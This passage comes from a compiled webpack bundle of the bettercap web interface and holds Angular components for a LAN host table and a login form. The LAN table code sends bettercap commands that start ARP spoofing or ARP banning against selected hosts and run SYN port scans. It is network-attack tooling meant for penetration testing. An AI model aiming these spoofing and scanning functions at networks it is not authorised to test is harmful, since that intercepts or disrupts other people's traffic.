sourceMappingURL=data:application/json;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbIi9Vc2Vycy9ldmlsc29ja2V0L0JhaGFtdXQvTGFiL2JldHRlcmNhcC91aS9zcmMvYXBwL2NvbXBvbmVudHMvbGFuLXRhYmxlL2xhbi10YWJsZS5jb21wb25lbnQuc2NzcyIsInNyYy9hcHAvY29tcG9uZW50cy9sYW4tdGFibGUvbGFuLXRhYmxlLmNvbXBvbmVudC5zY3NzIiwiL1VzZXJzL2V2aWxzb2NrZXQvQmFoYW11dC9MYWIvYmV0dGVyY2FwL3VpL3N0ZGluIl0sIm5hbWVzIjpbXSwibWFwcGluZ3MiOiJBQUFBO0VBQ0ksa0NBQUE7RUFDQSxnQkFBQTtFQUNBLGdCQUFBO0VBQ0Esa0JBQUE7RUFDQSxnQkFBQTtFQUNBLFFBQUE7RUFDQSxTQUFBO0VBQ0Esd0NBQUE7VUFBQSxnQ0FBQTtFQUNBLGFBQUE7RUFDQSxZQUFBO0VBQ0EsYUFBQTtFQUNBLG9CQUFBO0FDQ0o7O0FERUE7RUFDSSxpQkFBQTtFQUNBLGlCQUFBO0FDQ0o7O0FERUE7RUFDSSx5QkFBQTtBQ0NKOztBREVBO0VBQ0ksYUFBQTtFQUNBLGtCQUFBO0VBQ0EsUUFBQTtFQUNBLFlBQUE7RUFDQSx5QkFBQTtFQUNBLGtCQUFBO0VBQ0EseUJBQUE7RUFDQSxjQUFBO0VBQ0EsaUJBQUE7QUNDSjs7QURFQTtFQUNJLGNBQUE7RUFDQSxZQUFBO0VBQ0EseUJBQUE7RUFDQSxrQkFBQTtFQUNBLHlCQUFBO0VBQ0EsaUJBQUE7QUNDSjs7QURFUTtFQUNJLFlBQUE7RUFDQSxlQUFBO0FDQVo7O0FEQ1k7RUFDSSx5QkFBQTtBQ0NoQjs7QURDWTtFQUNJLHVCQUFBO0VBQ0Esc0JBQUE7RUFDQSxjQUFBO0VBQ0EsZUFBQTtBQ0NoQjs7QURBZ0I7RUFDSSxxQkFBQTtBQ0VwQjs7QURLQTtFQUNJLFdBQUE7RUFDQSxPQUFBO0FDRko7O0FES0E7RUFDSSx5QkFBQTtBQ0ZKOztBREdJO0VBQ0ksaUJBQUE7QUNEUjs7QURLQTs7O0VBR0ksbUJBQUE7QUNGSjs7QURPUTtFQUNJLHdDQUFBO0FDSlo7O0FDOUVJO0VBQ0ksZ0JBQUE7QURpRlIiLCJmaWxlIjoic3JjL2FwcC9jb21wb25lbnRzL2xhbi10YWJsZS9sYW4tdGFibGUuY29tcG9uZW50LnNjc3MiLCJzb3VyY2VzQ29udGVudCI6WyIucGF1c2VkOmFmdGVyIHtcbiAgICBmb250LWZhbWlseTogJ0ZvbnQgQXdlc29tZSA1IEZyZWUnO1xuICAgIGZvbnQtd2VpZ2h0OiA5MDA7XG4gICAgY29udGVudDogXCJcXGYwNGNcIjsgXG4gICAgcG9zaXRpb246IGFic29sdXRlO1xuICAgIGZvbnQtc2l6ZTogNDAwcHg7XG4gICAgdG9wOiA1MCU7XG4gICAgbGVmdDogNTAlO1xuICAgIHRyYW5zZm9ybTogdHJhbnNsYXRlKC01MCUsIC01MCUpO1xuICAgIG9wYWNpdHk6IC4wMjtcbiAgICBjb2xvcjogd2hpdGU7XG4gICAgei1pbmRleDogMTAwMDtcbiAgICBwb2ludGVyLWV2ZW50czogbm9uZTtcbn1cblxuZGl2LnRhYmxlLXJlc3BvbnNpdmUge1xuICAgIG1pbi1oZWlnaHQ6IDYwMHB4O1xuICAgIG92ZXJmbG93OiBpbml0aWFsO1xufVxuXG4udGFibGUgLnRhYmxlIHtcbiAgICBiYWNrZ3JvdW5kLWNvbG9yOiAjMzEzNTM5O1xufVxuXG5kaXYudGFibGUtZHJvcGRvd24ge1xuICAgIHotaW5kZXg6IDEwMDA7XG4gICAgcG9zaXRpb246IGFic29sdXRlO1xuICAgIHJpZ2h0OiAwO1xuICAgIHBhZGRpbmc6IDVweDtcbiAgICBib3JkZXI6IDFweCBzb2xpZCAjMjEyNTI5O1xuICAgIGJvcmRlci1yYWRpdXM6IDNweDtcbiAgICBiYWNrZ3JvdW5kLWNvbG9yOiAjMzEzNTM5O1xuICAgIGRpc3BsYXk6IHRhYmxlO1xuICAgIGZvbnQtc2l6ZTogLjhyZW07XG59XG5cbmRpdi5tZW51LWRyb3Bkb3duIHtcbiAgICB6LWluZGV4OiA5OTk5OTtcbiAgICBwYWRkaW5nOiA1cHg7XG4gICAgYm9yZGVyOiAxcHggc29saWQgIzIxMjUyOTtcbiAgICBib3JkZXItcmFkaXVzOiAzcHg7XG4gICAgYmFja2dyb3VuZC1jb2xvcjogIzMxMzUzOTtcbiAgICBmb250LXNpemU6IC44cmVtO1xuXG4gICAgdWwge1xuICAgICAgICBsaSB7XG4gICAgICAgICAgICBwYWRkaW5nOiA1cHg7XG4gICAgICAgICAgICBjdXJzb3I6IHBvaW50ZXI7XG4gICAgICAgICAgICAmOmhvdmVyIHtcbiAgICAgICAgICAgICAgICBiYWNrZ3JvdW5kLWNvbG9yOiAjNDE0NTQ5O1xuICAgICAgICAgICAgfVxuICAgICAgICAgICAgYSB7XG4gICAgICAgICAgICAgICAgY29sb3I6IHdoaXRlICFpbXBvcnRhbnQ7XG4gICAgICAgICAgICAgICAgd2lkdGg6IDEwMCUgIWltcG9ydGFudDtcbiAgICAgICAgICAgICAgICBkaXNwbGF5OiBibG9jaztcbiAgICAgICAgICAgICAgICBjdXJzb3I6IHBvaW50ZXI7XG4gICAgICAgICAgICAgICAgJjpob3ZlciB7XG4gICAgICAgICAgICAgICAgICAgIHRleHQtZGVjb3JhdGlvbjogbm9uZTtcbiAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICB9XG4gICAgICAgIH1cbiAgICB9XG59XG5cbi5kcm9wLWxlZnQge1xuICAgIHJpZ2h0OiBhdXRvO1xuICAgIGxlZnQ6IDA7XG59XG5cbnRyLmFsaXZlIHtcbiAgICBiYWNrZ3JvdW5kLWNvbG9yOiAjMzEzNTM5O1xuICAgIHRkLnRpbWUge1xuICAgICAgICBmb250LXdlaWdodDogYm9sZDsgXG4gICAgfVxufVxuXG50ZC5ub3dyYXAsXG50aC5ub3dyYXAsXG50ci5ub3dyYXAge1xuICAgIHdoaXRlLXNwYWNlOiBub3dyYXA7XG59XG5cbnRhYmxlLnRhYmxlLWRhcmsge1xuICAgIHRib2R5IHtcbiAgICAgICAgdHI6aG92ZXIge1xuICAgICAgICAgICAgYmFja2dyb3VuZC1jb2xvcjogcmdiYSgzOCwgNDUsIDUzLCAwLjk1KTtcbiAgICAgICAgfVxuICAgIH1cbn1cbiIsIi5wYXVzZWQ6YWZ0ZXIge1xuICBmb250LWZhbWlseTogXCJGb250IEF3ZXNvbWUgNSBGcmVlXCI7XG4gIGZvbnQtd2VpZ2h0OiA5MDA7XG4gIGNvbnRlbnQ6IFwiXFxmMDRjXCI7XG4gIHBvc2l0aW9uOiBhYnNvbHV0ZTtcbiAgZm9udC1zaXplOiA0MDBweDtcbiAgdG9wOiA1MCU7XG4gIGxlZnQ6IDUwJTtcbiAgdHJhbnNmb3JtOiB0cmFuc2xhdGUoLTUwJSwgLTUwJSk7XG4gIG9wYWNpdHk6IDAuMDI7XG4gIGNvbG9yOiB3aGl0ZTtcbiAgei1pbmRleDogMTAwMDtcbiAgcG9pbnRlci1ldmVudHM6IG5vbmU7XG59XG5cbmRpdi50YWJsZS1yZXNwb25zaXZlIHtcbiAgbWluLWhlaWdodDogNjAwcHg7XG4gIG92ZXJmbG93OiBpbml0aWFsO1xufVxuXG4udGFibGUgLnRhYmxlIHtcbiAgYmFja2dyb3VuZC1jb2xvcjogIzMxMzUzOTtcbn1cblxuZGl2LnRhYmxlLWRyb3Bkb3duIHtcbiAgei1pbmRleDogMTAwMDtcbiAgcG9zaXRpb246IGFic29sdXRlO1xuICByaWdodDogMDtcbiAgcGFkZGluZzogNXB4O1xuICBib3JkZXI6IDFweCBzb2xpZCAjMjEyNTI5O1xuICBib3JkZXItcmFkaXVzOiAzcHg7XG4gIGJhY2tncm91bmQtY29sb3I6ICMzMTM1Mzk7XG4gIGRpc3BsYXk6IHRhYmxlO1xuICBmb250LXNpemU6IDAuOHJlbTtcbn1cblxuZGl2Lm1lbnUtZHJvcGRvd24ge1xuICB6LWluZGV4OiA5OTk5OTtcbiAgcGFkZGluZzogNXB4O1xuICBib3JkZXI6IDFweCBzb2xpZCAjMjEyNTI5O1xuICBib3JkZXItcmFkaXVzOiAzcHg7XG4gIGJhY2tncm91bmQtY29sb3I6ICMzMTM1Mzk7XG4gIGZvbnQtc2l6ZTogMC44cmVtO1xufVxuZGl2Lm1lbnUtZHJvcGRvd24gdWwgbGkge1xuICBwYWRkaW5nOiA1cHg7XG4gIGN1cnNvcjogcG9pbnRlcjtcbn1cbmRpdi5tZW51LWRyb3Bkb3duIHVsIGxpOmhvdmVyIHtcbiAgYmFja2dyb3VuZC1jb2xvcjogIzQxNDU0OTtcbn1cbmRpdi5tZW51LWRyb3Bkb3duIHVsIGxpIGEge1xuICBjb2xvcjogd2hpdGUgIWltcG9ydGFudDtcbiAgd2lkdGg6IDEwMCUgIWltcG9ydGFudDtcbiAgZGlzcGxheTogYmxvY2s7XG4gIGN1cnNvcjogcG9pbnRlcjtcbn1cbmRpdi5tZW51LWRyb3Bkb3duIHVsIGxpIGE6aG92ZXIge1xuICB0ZXh0LWRlY29yYXRpb246IG5vbmU7XG59XG5cbi5kcm9wLWxlZnQge1xuICByaWdodDogYXV0bztcbiAgbGVmdDogMDtcbn1cblxudHIuYWxpdmUge1xuICBiYWNrZ3JvdW5kLWNvbG9yOiAjMzEzNTM5O1xufVxudHIuYWxpdmUgdGQudGltZSB7XG4gIGZvbnQtd2VpZ2h0OiBib2xkO1xufVxuXG50ZC5ub3dyYXAsXG50aC5ub3dyYXAsXG50ci5ub3dyYXAge1xuICB3aGl0ZS1zcGFjZTogbm93cmFwO1xufVxuXG50YWJsZS50YWJsZS1kYXJrIHRib2R5IHRyOmhvdmVyIHtcbiAgYmFja2dyb3VuZC1jb2xvcjogcmdiYSgzOCwgNDUsIDUzLCAwLjk1KTtcbn1cblxudGQubWV0YXMgLmJhZGdlIHtcbiAgbWFyZ2luLWxlZnQ6IDVweDtcbn0iLCJAaW1wb3J0IFwidGFibGVzXCI7XG5cbnRkLm1ldGFzIHtcbiAgICAuYmFkZ2Uge1xuICAgICAgICBtYXJnaW4tbGVmdDogNXB4O1xuICAgIH1cbn1cbiJdfQ== */"

/***/ }),

/***/ "./src/app/components/lan-table/lan-table.component.ts":
/*!*************************************************************!*\
  !*** ./src/app/components/lan-table/lan-table.component.ts ***!
  \*************************************************************/
/*! exports provided: LanTableComponent */
/***/ (function(module, __webpack_exports__, __webpack_require__) {

"use strict";
__webpack_require__.r(__webpack_exports__);
/* harmony export (binding) */ __webpack_require__.d(__webpack_exports__, "LanTableComponent", function() { return LanTableComponent; });
/* harmony import */ var tslib__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! tslib */ "./node_modules/tslib/tslib.es6.js");
/* harmony import */ var _angular_core__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__(/*! @angular/core */ "./node_modules/@angular/core/fesm5/core.js");
/* harmony import */ var _services_sort_service__WEBPACK_IMPORTED_MODULE_2__ = __webpack_require__(/*! ../../services/sort.service */ "./src/app/services/sort.service.ts");
/* harmony import */ var _services_api_service__WEBPACK_IMPORTED_MODULE_3__ = __webpack_require__(/*! ../../services/api.service */ "./src/app/services/api.service.ts");
/* harmony import */ var _services_omnibar_service__WEBPACK_IMPORTED_MODULE_4__ = __webpack_require__(/*! ../../services/omnibar.service */ "./src/app/services/omnibar.service.ts");
/* harmony import */ var _services_clipboard_service__WEBPACK_IMPORTED_MODULE_5__ = __webpack_require__(/*! ../../services/clipboard.service */ "./src/app/services/clipboard.service.ts");






var LanTableComponent = /** @class */ (function () {
    function LanTableComponent(api, sortService, omnibar, clipboard) {
        this.api = api;
        this.sortService = sortService;
        this.omnibar = omnibar;
        this.clipboard = clipboard;
        this.hosts = [];
        this.isSpoofing = false;
        this.viewSpoof = false;
        this.spoofList = {};
        this.spoofOpts = {
            targets: '',
            whitelist: '',
            fullduplex: false,
            internal: false,
            ban: false
        };
        this.scanState = {
            scanning: [],
            progress: 0.0
        };
        this.visibleMeta = null;
        this.visibleMenu = null;
        this.sort = { field: 'ipv4', type: 'ip', direction: 'desc' };
        this.update(this.api.session);
    }
    LanTableComponent.prototype.ngOnInit = function () {
        var _this = this;
        this.api.onNewData.subscribe(function (session) {
            _this.update(session);
        });
        this.sortSub = this.sortService.onSort.subscribe(function (event) {
            _this.sort = event;
            _this.sortService.sort(_this.hosts, event);
        });
    };
    LanTableComponent.prototype.ngOnDestroy = function () {
        this.sortSub.unsubscribe();
    };
    LanTableComponent.prototype.isSpoofed = function (host) {
        return (host.ipv4 in this.spoofList);
    };
    LanTableComponent.prototype.updateSpoofOpts = function () {
        this.spoofOpts.targets = Object.keys(this.spoofList).join(', ');
    };
    LanTableComponent.prototype.resetSpoofOpts = function () {
        this.spoofOpts = {
            targets: this.api.session.env.data['arp.spoof.targets'],
            whitelist: this.api.session.env.data['arp.spoof.whitelist'],
            fullduplex: this.api.session.env.data['arp.spoof.fullduplex'].toLowerCase() == 'true',
            internal: this.api.session.env.data['arp.spoof.internal'].toLowerCase() == 'true',
            ban: false
        };
    };
    LanTableComponent.prototype.hideSpoofMenu = function () {
        this.viewSpoof = false;
        this.resetSpoofOpts();
    };
    LanTableComponent.prototype.showSpoofMenuFor = function (host, add) {
        if (add)
            this.spoofList[host.ipv4] = true;
        else
            delete this.spoofList[host.ipv4];
        this.updateSpoofOpts();
        this.visibleMenu = null;
        this.viewSpoof = true;
    };
    LanTableComponent.prototype.updateSpoofingList = function () {
        var newSpoofList = this.spoofList;
        $('.spoof-toggle').each(function (i, toggle) {
            var $toggle = $(toggle);
            var ip = $toggle.attr('data-ip');
            if ($toggle.is(':checked')) {
                newSpoofList[ip] = true;
            }
            else {
                delete newSpoofList[ip];
            }
        });
        this.spoofList = newSpoofList;
        this.updateSpoofOpts();
    };
    LanTableComponent.prototype.onSpoofStart = function () {
        if (this.isSpoofing && !confirm("This will unspoof the current targets, set the new parameters and restart the module. Continue?"))
            return;
        this.api.cmd('set arp.spoof.targets ' + (this.spoofOpts.targets == "" ? '""' : this.spoofOpts.targets));
        this.api.cmd('set arp.spoof.whitelist ' + (this.spoofOpts.whitelist == "" ? '""' : this.spoofOpts.whitelist));
        this.api.cmd('set arp.spoof.fullduplex ' + this.spoofOpts.fullduplex);
        this.api.cmd('set arp.spoof.internal ' + this.spoofOpts.internal);
        var onCmd = this.spoofOpts.ban ? 'arp.ban on' : 'arp.spoof on';
        if (this.isSpoofing) {
            this.api.cmd('arp.spoof off; ' + onCmd);
        }
        else {
            this.api.cmd(onCmd);
        }
        this.viewSpoof = false;
        this.resetSpoofOpts();
    };
    LanTableComponent.prototype.update = function (session) {
        var ipRe = /^(?=.*[^\.]$)((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.?){4}$/;
        var spoofing = this.api.session.env.data['arp.spoof.targets']
            // split by comma and trim spaces
            .split(',')
            .map(function (s) { return s.trim(); })
            // remove empty elements
            .filter(function (s) { return s.length; });
        this.isSpoofing = this.api.module('arp.spoof').running;
        this.scanState = this.api.module('syn.scan').state;
        // freeze the interface while the user is doing something
        if (this.viewSpoof || $('.menu-dropdown').is(':visible'))
            return;
        this.resetSpoofOpts();
        this.spoofList = {};
        // if there are elements that are not IP addresses, it means the user
        // has set the variable manually, which overrides the UI spoof list.
        for (var i_1 = 0; i_1 < spoofing.length; i_1++) {
            if (ipRe.test(spoofing[i_1])) {
                this.spoofList[spoofing[i_1]] = true;
            }
            else {
                this.spoofList = {};
                break;
            }
        }
        this.iface = session.interface;
        this.gateway = session.gateway;
        this.hosts = [];
        // if we `this.hosts` = session.lan['hosts'], pushing
        // to this.hosts will also push to the session object
        // duplicating the iface and gateway.
        for (var i = 0; i < session.lan['hosts'].length; i++) {
            var host = session.lan['hosts'][i];
            // get traffic details for this host
            var sent = 0, received = 0;
            if (host.ipv4 in session.packets.traffic) {
                var traffic = session.packets.traffic[host.ipv4];
                sent = traffic.sent;
                received = traffic.received;
            }
            host.sent = sent;
            host.received = received;
            this.hosts.push(host);
        }
        if (this.iface.mac == this.gateway.mac) {
            this.hosts.push(this.iface);
        }
        else {
            this.hosts.push(this.iface);
            this.hosts.push(this.gateway);
        }
        this.sortService.sort(this.hosts, this.sort);
    };
    LanTableComponent.prototype.setAlias = function (host) {
        $('#in').val(host.alias);
        $('#inhost').val(host.mac);
        $('#inputModalTitle').html('Set alias for ' + host.mac);
        $('#inputModal').modal('show');
    };
    LanTableComponent.prototype.doSetAlias = function () {
        $('#inputModal').modal('hide');
        var mac = $('#inhost').val();
        var alias = $('#in').val();
        if (alias.trim() == "")
            alias = '""';
        this.api.cmd("alias " + mac + " " + alias);
    };
    LanTableComponent.prototype.showScannerModal = function (host) {
        $('#scanIP').val(host.ipv4);
        $('#startPort').val('1');
        $('#endPort').val('10000');
        $('#scannerModal').modal('show');
    };
    LanTableComponent.prototype.doPortScan = function () {
        var ip = $('#scanIP').val();
        var startPort = $('#startPort').val();
        var endPort = $('#endPort').val();
        $('#scannerModal').modal('hide');
        this.api.cmd("syn.scan " + ip + " " + startPort + " " + endPort);
    };
    LanTableComponent.prototype.groupMetas = function (metas) {
        var grouped = {};
        for (var name_1 in metas) {
            var parts = name_1.split(':'), group = parts[0].toUpperCase(), sub = parts[1];
            if (group in grouped) {
                grouped[group][sub] = metas[name_1];
            }
            else {
                grouped[group] = {};
                grouped[group][sub] = metas[name_1];
            }
        }
        // console.log("grouped", grouped);
        return grouped;
    };
    LanTableComponent = tslib__WEBPACK_IMPORTED_MODULE_0__["__decorate"]([
        Object(_angular_core__WEBPACK_IMPORTED_MODULE_1__["Component"])({
            selector: 'ui-lan-table',
            template: __webpack_require__(/*! ./lan-table.component.html */ "./src/app/components/lan-table/lan-table.component.html"),
            styles: [__webpack_require__(/*! ./lan-table.component.scss */ "./src/app/components/lan-table/lan-table.component.scss")]
        }),
        tslib__WEBPACK_IMPORTED_MODULE_0__["__metadata"]("design:paramtypes", [_services_api_service__WEBPACK_IMPORTED_MODULE_3__["ApiService"], _services_sort_service__WEBPACK_IMPORTED_MODULE_2__["SortService"], _services_omnibar_service__WEBPACK_IMPORTED_MODULE_4__["OmniBarService"], _services_clipboard_service__WEBPACK_IMPORTED_MODULE_5__["ClipboardService"]])
    ], LanTableComponent);
    return LanTableComponent;
}());



/***/ }),

/***/ "./src/app/components/login/login.component.html":
/*!*******************************************************!*\
  !*** ./src/app/components/login/login.component.html ***!
  \*******************************************************/
/*! no static exports found */
/***/ (function(module, exports) {

module.exports = "<form [formGroup]=\"loginForm\" (ngSubmit)=\"onSubmit()\" class=\"form-signin shadow-lg p-3 mb-5 bg-white rounded\">\n  <img [src]=\"'./assets/images/logo.png'\" width=\"150px\" alt=\"bettercap - Logo\" class=\"img-responsive\">\n  <div style=\"text-align: center; margin-top: 15px\">\n    <small>bettercap {{ env.name }} v{{ env.version }} | requires bettercap v{{ env.requires }}</small>\n  </div>\n\n  <hr/>\n\n  <ngb-alert *ngIf=\"error && error.status == 401 && submitted\" type=\"danger\" (close)=\"error = submitted = false\">\n    {{error.status}} {{error.statusText}}: wrong credentials.\n  </ngb-alert>\n  <ngb-alert *ngIf=\"error && error.status == 666 && submitted\" type=\"danger\" (close)=\"error = submitted = false\">\n    {{ error.error }}\n  </ngb-alert>\n\n  <div class=\"form-group\">\n    <label for=\"username\">Username</label>\n    <input type=\"text\" formControlName=\"username\" id=\"username\" class=\"form-control\" autofocus>\n    <ngb-alert *ngIf=\"submitted && form.username.errors && form.username.errors.required\" type=\"danger\">\n      Username required.\n    </ngb-alert>\n  </div>\n  \n  <div class=\"form-group\">\n    <label for=\"password\">Password</label>\n    <input type=\"password\" formControlName=\"password\" id=\"password\" class=\"form-control\">\n    <ngb-alert *ngIf=\"submitted && form.password.errors && form.password.errors.required\" type=\"danger\">\n      Password required.\n    </ngb-alert>\n  </div>\n\n  <div class=\"form-group\">\n    <label for=\"url\">API URL</label>\n    <input type=\"text\" formControlName=\"url\" id=\"url\" class=\"form-control\" required>\n    <ngb-alert *ngIf=\"submitted && error && error.status === 0\" type=\"danger\" (close)=\"error = submitted = false\">\n      Can't connect to {{ api.settings.URL() }}\n    </ngb-alert>\n  </div>\n\n  <button class=\"btn btn-dark btn-lg btn-block\">Login</button>\n</form>\n"

/***/ }),

/***/ "./src/app/components/login/login.component.scss":
/*!*******************************************************!*\
  !*** ./src/app/components/login/login.component.scss ***!
  \*******************************************************/
/*! no static exports found */
/***/ (function(module, exports) {

module.exports = ".form-signin {\n  width: 100%;\n  max-width: 500px;\n  padding: 15px;\n  position: absolute;\n  top: 50%;\n  left: 50%;\n  -webkit-transform: translate(-50%, -50%);\n          transform: translate(-50%, -50%);\n  background-color: white;\n}\n\n.form-signin .form-control:focus {\n  z-index: 2;\n}\n\n.form-signin input[type=text] {\n  margin-bottom: -1px;\n  border-bottom-right-radius: 0;\n  border-bottom-left-radius: 0;\n}\n\n.form-signin input[type=password] {\n  margin-bottom: 10px;\n  border-top-left-radius: 0;\n  border-top-right-radius: 0;\n}\n/*# sourceMappingURL=data:application/json;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbIi9Vc2Vycy9ldmlsc29ja2V0L0JhaGFtdXQvTGFiL2JldHRlcmNhcC91aS9zcmMvYXBwL2NvbXBvbmVudHMvbG9naW4vbG9naW4uY29tcG9uZW50LnNjc3MiLCJzcmMvYXBwL2NvbXBvbmVudHMvbG9naW4vbG9naW4uY29tcG9uZW50LnNjc3MiXSwibmFtZXMiOltdLCJtYXBwaW5ncyI6IkFBQUE7RUFDSSxXQUFBO0VBRUEsZ0JBQUE7RUFDQSxhQUFBO0VBQ0Esa0JBQUE7RUFDQSxRQUFBO0VBQ0EsU0FBQTtFQUNBLHdDQUFBO1VBQUEsZ0NBQUE7RUFDQSx1QkFBQTtBQ0FKOztBRFFBO0VBQ0ksVUFBQTtBQ0xKOztBRFFBO0VBQ0ksbUJBQUE7RUFDQSw2QkFBQTtFQUNBLDRCQUFBO0FDTEo7O0FEUUE7RUFDSSxtQkFBQTtFQUNBLHlCQUFBO0VBQ0EsMEJBQUE7QUNMSiIsImZpbGUiOiJzcmMvYXBwL2NvbXBvbmVudHMvbG9naW4vbG9naW4uY29tcG9uZW50LnNjc3MiLCJzb3VyY2VzQ29udGVudCI6WyIuZm9ybS1zaWduaW4ge1xuICAgIHdpZHRoOiAxMDAlO1xuICAgIC8vIG1heC13aWR0aDogMzMwcHg7XG4gICAgbWF4LXdpZHRoOiA1MDBweDtcbiAgICBwYWRkaW5nOiAxNXB4O1xuICAgIHBvc2l0aW9uOiBhYnNvbHV0ZTtcbiAgICB0b3A6IDUwJTtcbiAgICBsZWZ0OiA1MCU7XG4gICAgdHJhbnNmb3JtOiB0cmFuc2xhdGUoLTUwJSwgLTUwJSk7XG4gICAgYmFja2dyb3VuZC1jb2xvcjogd2hpdGU7XG59XG5cblxuLmZvcm0tc2lnbmluIC5mb3JtLWNvbnRyb2wge1xuXG59XG5cbi5mb3JtLXNpZ25pbiAuZm9ybS1jb250cm9sOmZvY3VzIHtcbiAgICB6LWluZGV4OiAyO1xufVxuXG4uZm9ybS1zaWduaW4gaW5wdXRbdHlwZT1cInRleHRcIl0ge1xuICAgIG1hcmdpbi1ib3R0b206IC0xcHg7XG4gICAgYm9yZGVyLWJvdHRvbS1yaWdodC1yYWRpdXM6IDA7XG4gICAgYm9yZGVyLWJvdHRvbS1sZWZ0LXJhZGl1czogMDtcbn1cblxuLmZvcm0tc2lnbmluIGlucHV0W3R5cGU9XCJwYXNzd29yZFwiXSB7XG4gICAgbWFyZ2luLWJvdHRvbTogMTBweDtcbiAgICBib3JkZXItdG9wLWxlZnQtcmFkaXVzOiAwO1xuICAgIGJvcmRlci10b3AtcmlnaHQtcmFkaXVzOiAwO1xufVxuIiwiLmZvcm0tc2lnbmluIHtcbiAgd2lkdGg6IDEwMCU7XG4gIG1heC13aWR0aDogNTAwcHg7XG4gIHBhZGRpbmc6IDE1cHg7XG4gIHBvc2l0aW9uOiBhYnNvbHV0ZTtcbiAgdG9wOiA1MCU7XG4gIGxlZnQ6IDUwJTtcbiAgdHJhbnNmb3JtOiB0cmFuc2xhdGUoLTUwJSwgLTUwJSk7XG4gIGJhY2tncm91bmQtY29sb3I6IHdoaXRlO1xufVxuXG4uZm9ybS1zaWduaW4gLmZvcm0tY29udHJvbDpmb2N1cyB7XG4gIHotaW5kZXg6IDI7XG59XG5cbi5mb3JtLXNpZ25pbiBpbnB1dFt0eXBlPXRleHRdIHtcbiAgbWFyZ2luLWJvdHRvbTogLTFweDtcbiAgYm9yZGVyLWJvdHRvbS1yaWdodC1yYWRpdXM6IDA7XG4gIGJvcmRlci1ib3R0b20tbGVmdC1yYWRpdXM6IDA7XG59XG5cbi5mb3JtLXNpZ25pbiBpbnB1dFt0eXBlPXBhc3N3b3JkXSB7XG4gIG1hcmdpbi1ib3R0b206IDEwcHg7XG4gIGJvcmRlci10b3AtbGVmdC1yYWRpdXM6IDA7XG4gIGJvcmRlci10b3AtcmlnaHQtcmFkaXVzOiAwO1xufSJdfQ== */"

/***/ }),

/***/ "./src/app/components/login/login.component.ts":
/*!*****************************************************!*\
  !*** ./src/app/components/login/login.component.ts ***!
  \*****************************************************/
/*! exports provided: LoginComponent */
/***/ (function(module, __webpack_exports__, __webpack_require__) {

"use strict";
__webpack_require__.r(__webpack_exports__);
/* harmony export (binding) */ __webpack_require__.d(__webpack_exports__, "LoginComponent", function() { return LoginComponent; });
/* harmony import */ var tslib__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! tslib */ "./node_modules/tslib/tslib.es6.js");
/* harmony import */ var _angular_core__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__(/*! @angular/core */ "./node_modules/@angular/core/fesm5/core.js");
/* harmony import */ var _angular_router__WEBPACK_IMPORTED_MODULE_2__ = __webpack_require__(/*! @angular/router */ "./node_modules/@angular/router/fesm5/router.js");
/* harmony import */ var _angular_forms__WEBPACK_IMPORTED_MODULE_3__ = __webpack_require__(/*! @angular/forms */ "./node_modules/@angular/forms/fesm5/forms.js");
/* harmony import */ var _services_api_service__WEBPACK_IMPORTED_MODULE_4__ = __webpack_require__(/*! ../../services/api.service */ "./src/app/services/api.service.ts");
/* harmony import */ var _environments_environment__WEBPACK_IMPORTED_MODULE_5__ = __webpack_require__(/*! ../../../environments/environment */ "./src/environments/environment.ts");
/* harmony import */ var url_parse__WEBPACK_IMPORTED_MODULE_6__ = __webpack_require__(/*! url-parse */ "./node_modules/url-parse/index.js");
/* harmony import */ var url_parse__WEBPACK_IMPORTED_MODULE_6___default = /*#__PURE__*/__webpack_require__.n(url_parse__WEBPACK_IMPORTED_MODULE_6__);







var LoginComponent = /** @class */ (function () {
    function LoginComponent(api, formBuilder, route, router) {
        this.api = api;
        this.formBuilder = formBuilder;
        this.route = route;
        this.router = router;
        this.submitted = false;
        this.mismatch = null;
        this.subscriptions = [];
        this.returnTo = "/";
        this.env = _environments_environment__WEBPACK_IMPORTED_MODULE_5__["environment"];
        console.log("env:", this.env);
        if (this.api.Ready()) {
            console.log("user already logged in");
            this.router.navigateByUrl("/");
        }
    }
    LoginComponent.prototype.ngOnInit = function () {
        var _this = this;
        this.api.logout();
        this.returnTo = this.route.snapshot.queryParams['returnTo'] || '/';
        this.loginForm = this.formBuilder.group({
            username: [''],
            password: [''],
            url: [this.api.settings.URL(), _angular_forms__WEBPACK_IMPORTED_MODULE_3__["Validators"].required]
        });
        this.subscriptions = [
            this.api.onSessionError.subscribe(function (error) {
                console.log(error);
                _this.error = error;
                console.log("session error:" + error);
            }),
            this.api.onLoggedOut.subscribe(function (error) {
                _this.error = error;
                console.log("logged out:" + error);
            }),
            this.api.onLoggedIn.subscribe(function () {
                console.log("logged in");
                _this.router.navigateByUrl(_this.returnTo);
            })
        ];
    };
    LoginComponent.prototype.ngOnDestroy = function () {
        for (var i = 0; i < this.subscriptions.length; i++) {
            this.subscriptions[i].unsubscribe();
        }
        this.subscriptions = [];
    };
    Object.defineProperty(LoginComponent.prototype, "form", {
        get: function () {
            return this.loginForm.controls;
        },
        enumerable: true,
        configurable: true
    });
    LoginComponent.prototype.onSubmit = function () {
        var _this = this;
        this.error = null;
        this.submitted = true;
        if (!this.loginForm.invalid) {
            var parsed = url_parse__WEBPACK_IMPORTED_MODULE_6__(this.form.url.value, false);
            this.api.settings.schema = parsed.protocol;
            this.api.settings.host = parsed.hostname;
            this.api.settings.port = parsed.port;
            this.api.settings.path = parsed.pathname;
            this.api
                .login(this.form.username.value, this.form.password.value)
                .subscribe(function (value) { }, function (error) { _this.error = error; });
        }
    };
    LoginComponent = tslib__WEBPACK_IMPORTED_MODULE_0__["__decorate"]([
        Object(_angular_core__WEBPACK_IMPORTED_MODULE_1__["Component"])({
            selector: 'ui-login',
            template: __webpack_require__(/*! ./login.component.html */ "./src/app/components/login/login.component.html"),
            styles: [__webpack_require__(/*! ./login.component.scss */ "./src/app/components/login/login.component.scss")]
        }),
